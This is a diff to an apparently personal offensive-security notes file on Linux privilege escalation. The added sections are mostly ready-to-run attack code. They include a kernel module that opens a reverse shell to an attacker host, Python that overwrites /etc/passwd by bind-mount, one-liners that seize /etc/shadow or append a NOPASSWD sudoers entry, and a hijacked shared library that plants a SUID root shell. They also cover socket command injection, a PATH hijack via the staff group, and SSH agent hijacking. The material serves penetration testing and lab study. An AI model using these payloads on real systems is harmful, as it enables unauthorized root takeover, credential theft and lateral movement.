@@ -4,8 +4,8 @@ type: technique
 tags: [0xdf, exploitation, git-poc, htb, linux, post-exploitation, privilege-escalation, thm]
 phase: post-exploitation
 date_created: 2026-05-08
-date_updated: 2026-07-02
-sources: [thm-linux-privesc, thm-python-lib-hijack, thm-lxd-gamingserver, git-copyfail-go, git-cve-2026-31431, 0xdf-linux-privesc]
+date_updated: 2026-07-14
+sources: [thm-linux-privesc, thm-python-lib-hijack, thm-lxd-gamingserver, git-copyfail-go, git-cve-2026-31431, 0xdf-linux-privesc, hacktricks-linux]
 ---
 
 # Linux Privilege Escalation
@@ -974,6 +974,8 @@ sudo PATH=$PWD:$PATH /opt/cleanup.sh
 
 ### Docker Group
 
+> Beyond the host `docker` group: reachable runtime sockets, `runc`/`ctr` host mounts, sensitive host mounts, privileged-container and Kubernetes-node escapes are collected in [[linux-container-escape]].
+
 Being in the `docker` group is equivalent to root.
 
 ```bash
@@ -1207,3 +1209,221 @@ python3 -c 'import socket; socket.socket(38,socket.SOCK_SEQPACKET).bind(("aead",
 `os.splice` unavailability is a Python-version issue, not a "not vulnerable" signal - port and re-run.
 
 <!-- promoted-slug: copyfail-py38-splice -->
+
+---
+
+## Capability enumeration and the empty-capability SUID trick
+
+The specific-capability examples above skip the enumeration methodology and the CapEff bitmask decode, which is how you actually triage capability privesc on a live box. Per-process caps live in `/proc/<pid>/status` (five sets: CapInh, CapPrm, CapEff, CapBnd, CapAmb); file caps live in extended attributes.
+
+```bash
+# Decode a process capability bitmask to names
+grep Cap /proc/self/status
+capsh --decode=0000003fffffffff        # a full-root mask
+getpcaps <pid>                          # caps of a running process by PID
+getcap -r / 2>/dev/null                 # file caps across the FS
+```
+
+The `+ep` / `+eip` / `=ep` suffix matters: `e`=effective, `p`=permitted, `i`=inheritable. A subtle but real primitive: a binary with an EMPTY capability set (`getcap x` shows `x =ep`) that is not root-owned and has no SUID bit will still run with euid 0, because an empty file-cap set with the effective flag forces uid 0 on exec. Flag any `=ep` binary as a root-exec path even without SUID.
+
+---
+
+## CAP_SYS_MODULE: load a malicious kernel module
+
+`cap_sys_module` on any binary (commonly a scripting interpreter, or on `/bin/kmod` itself) lets you insert a kernel module, which is game over: the module runs in kernel context and can spawn a root shell via `call_usermodehelper`. Build a tiny LKM off-target and `insmod` it.
+
+```c
+// reverse-shell.c
+#include <linux/kmod.h>
+#include <linux/module.h>
+MODULE_LICENSE("GPL");
+static char *argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/ATTACKER/4444 0>&1", NULL};
+static char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
+static int __init x(void){ return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC); }
+static void __exit y(void){}
+module_init(x); module_exit(y);
+```
+
+```makefile
+# Makefile (indent MUST be a tab)
+obj-m += reverse-shell.o
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+```
+
+```bash
+make                       # compile against the target kernel headers
+nc -lvnp 4444 &            # on attacker
+insmod reverse-shell.ko    # binary with cap_sys_module; or via python kmod / modprobe
+```
+
+If only a scripting binary carries the cap, fake `/lib/modules/$(uname -r)/` in a writable dir and load with python `kmod`. Detect with `getcap -r / 2>/dev/null | grep sys_module` and `capsh --print | grep sys_module` inside a container (this is also a classic container breakout when SYS_MODULE is in the container's cap set; see [[linux-container-escape]]).
+
+---
+
+## CAP_SYS_ADMIN: bind-mount a fake /etc/passwd (and mount the host disk in containers)
+
+`cap_sys_admin` is near-root because it grants `mount(2)`. On a bare host with a SYS_ADMIN-capable binary you can bind-mount an attacker-crafted passwd file over the real one, then `su` with a known password.
+
+```python
+# python binary with cap_sys_admin+ep
+from ctypes import CDLL, c_char_p, c_ulong
+libc = CDLL("libc.so.6")
+MS_BIND = 4096
+libc.mount(b"/tmp/fake_passwd", b"/etc/passwd", b"none", MS_BIND, b"rw")
+# /tmp/fake_passwd = copy of /etc/passwd with root's hash replaced (openssl passwd -1)
+```
+
+In a container that holds SYS_ADMIN, the same cap lets you mount the host block device directly and chroot in (see also [[linux-container-escape]]):
+
+```bash
+capsh --print | grep sys_admin
+fdisk -l                    # find host disk, e.g. /dev/sda
+mount /dev/sda /mnt && chroot /mnt bash
+```
+
+---
+
+## CAP_CHOWN / CAP_FOWNER / CAP_DAC_OVERRIDE: seize /etc/shadow
+
+The examples above cover `cap_dac_read_search` (read any file) but not the write-side caps. Each of these, on a scripting binary, yields root without touching disk permissions the normal way:
+
+```bash
+# cap_chown: chown /etc/shadow to yourself, then edit it
+python3 -c 'import os; os.chown("/etc/shadow", os.getuid(), os.getgid())'
+
+# cap_fowner: bypass permission checks that require being the file owner (e.g. chmod any file)
+# cap_dac_override: bypass ALL write-permission checks, write any file directly
+python3 -c 'open("/etc/sudoers","a").write("\nyouruser ALL=(ALL) NOPASSWD:ALL\n")'
+ruby -e 'require "fileutils"; FileUtils.chown(Process.uid, Process.gid, "/etc/shadow")'
+```
+
+`cap_dac_override` is the strongest of the three: append a NOPASSWD sudoers line, add a UID-0 user to `/etc/passwd`, or drop an SSH key into `/root/.ssh/`.
+
+---
+
+## ld.so.conf / ldconfig library hijack (works against SUID binaries)
+
+Distinct from LD_PRELOAD: SUID/secure-execution binaries IGNORE `LD_PRELOAD` and `LD_LIBRARY_PATH`, but they STILL trust directories listed in `/etc/ld.so.conf` and `/etc/ld.so.conf.d/*.conf`. So write access to any of those config files (or to a directory they reference), or `sudo` over `ldconfig`, is a hijack of the very libs a root/SUID binary loads.
+
+```bash
+# Triage: which lib does the target need, and where is it resolving from?
+readelf -d ./target | grep NEEDED
+LD_DEBUG=libs ./target 2>&1 | grep -E 'find library|trying file'
+ldconfig -p | grep <libname>
+```
+
+Case A, writable ld.so.conf.d entry: point the loader at a writable dir, drop a malicious lib with the same soname, wait for root/ldconfig.
+
+```bash
+echo "/home/me/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf   # or you already have write here
+# build malicious lib exporting the same symbol the binary calls
+cat > /home/me/lib/libcustom.c <<'EOF'
+#include <stdlib.h>
+void vuln_func(void){ setuid(0); setgid(0);
+  system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash"); }
+EOF
+gcc -shared -fPIC -Wl,-soname,libcustom.so -o /home/me/lib/libcustom.so /home/me/lib/libcustom.c
+# after ldconfig/reboot, once the SUID/root binary runs:  /tmp/rootbash -p
+```
+
+Case B, `sudo ldconfig`: you control which conf to load, so include a dir you own.
+
+```bash
+cd /tmp; mkdir -p conf; echo "include /tmp/conf/*" > fake.conf; echo "/tmp" > conf/evil.conf
+# place malicious libcustom.so in /tmp
+sudo ldconfig -f /tmp/fake.conf
+```
+
+Gotcha: `sudo echo x > /etc/ld.so.conf.d/y.conf` fails (shell does the redirect as you); use `... | sudo tee`.
+
+---
+
+## polkit / pkexec via a privileged group
+
+Separate from the PwnKit CVE (already in [[privesc-exploit-arsenal]]): if `pkexec` is SUID and you are in a group listed in the polkit local-authority config (often `sudo` or `admin` by default on some distros), you can run commands as root through polkit even with no sudoers entry.
+
+```bash
+find / -perm -4000 2>/dev/null | grep pkexec
+cat /etc/polkit-1/localauthority.conf.d/*     # which groups may use pkexec
+pkexec /bin/sh                                # prompts for YOUR password
+```
+
+Over SSH with no GUI, `pkexec` returns "No session for cookie". Work around it with two SSH sessions and `pkttyagent`:
+
+```bash
+# session 1:
+echo $$                     # note PID, then run:
+pkexec /bin/bash
+# session 2:
+pkttyagent --process <PID_from_session1>   # authenticate here; session 1 becomes root
+```
+
+---
+
+## Interesting group memberships (disk, shadow, adm, staff, video, backup)
+
+`id` group membership is a fast win the checklist names but does not exploit. Concrete primitives:
+
+| Group | Primitive |
+|-------|-----------|
+| `disk` | Near-root: raw block-device access. `debugfs /dev/sda1` then `cat /root/.ssh/id_rsa` / `cat /etc/shadow`; `debugfs -w` can also write. |
+| `shadow` | Read `/etc/shadow` directly, then crack (`!hash` = locked, `*` = no hash set). |
+| `staff` | Write `/usr/local/*` which is early in root's PATH. Drop a `/usr/local/bin/run-parts` shim; it fires on cron.hourly and on every SSH login (MOTD), then `/bin/bash -p`. |
+| `video` | Read the framebuffer: `cat /dev/fb0 > screen.raw` + resolution from `/sys/class/graphics/fb0/virtual_size`, open as raw in GIMP to see the console. |
+| `adm` | Read `/var/log/*` for creds/tokens in logs. |
+| `root` (secondary) | Enumerate what it can write: `find / -group root -perm -g=w 2>/dev/null` (service configs, libs). |
+| `backup` / `operator` / `lp` / `mail` | Credential-discovery vectors: archives, spools, mail (reset links/OTPs). Pivot via password/token reuse. |
+
+```bash
+# disk group -> read root's key without being root
+debugfs /dev/sda1
+debugfs:  cat /root/.ssh/id_rsa
+
+# staff group -> run-parts PATH hijack
+printf '#!/bin/bash\nchmod 4777 /bin/bash\n' > /usr/local/bin/run-parts
+chmod +x /usr/local/bin/run-parts   # trigger by opening a new SSH session, then: /bin/bash -p
+```
+
+---
+
+## Writable UNIX socket / systemd socket command injection
+
+A root process may listen on a UNIX socket and execute what it receives (directly, or via a systemd `.socket` unit that activates a root service). If the socket is world-writable, send it a command.
+
+```bash
+# find writable sockets and their owners
+netstat -a -p --unix 2>/dev/null | grep -i listen
+find / -type s 2>/dev/null
+ss -xlp
+
+# if a root-owned socket pipes input to a shell:
+echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" | socat - UNIX-CLIENT:/tmp/socket_test.s
+/tmp/bash -p
+```
+
+Also check writable systemd socket units and the service they activate:
+
+```bash
+find / -name '*.socket' -writable 2>/dev/null
+# edit ListenStream / the paired .service ExecStart, then: systemctl daemon-reload; trigger the socket
+```
+
+Some root daemons bind privileged actions to client-supplied thread IDs + signals (LG webOS class); if the protocol lets an unprivileged client pick the target TID, a crafted request + signal can trip the privileged path. Harden by enforcing SO_PEERCRED on the socket.
+
+Related: [[linux-dbus-privesc]] applies the same IPC-to-root idea to D-Bus system-bus services.
+
+---
+
+## SSH agent hijacking (SSH_AUTH_SOCK)
+
+If `ForwardAgent yes` is set (in `/etc/ssh/ssh_config` or a user's `~/.ssh/config`) and you are root (or the agent's owner), you can reuse a live agent socket left in `/tmp` or `/run/user/*` to authenticate as that user to any host their key unlocks, without ever reading the private key (it stays in agent memory).
+
+```bash
+# hunt for agent sockets
+ls -la /run/user/*/ssh-* /tmp/ssh-* 2>/dev/null
+find /run/user /tmp -type s -name 'agent.*' 2>/dev/null
+
+# impersonate the socket's owner
+SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.NNNN ssh -o IdentitiesOnly=no user@nexthost
+```
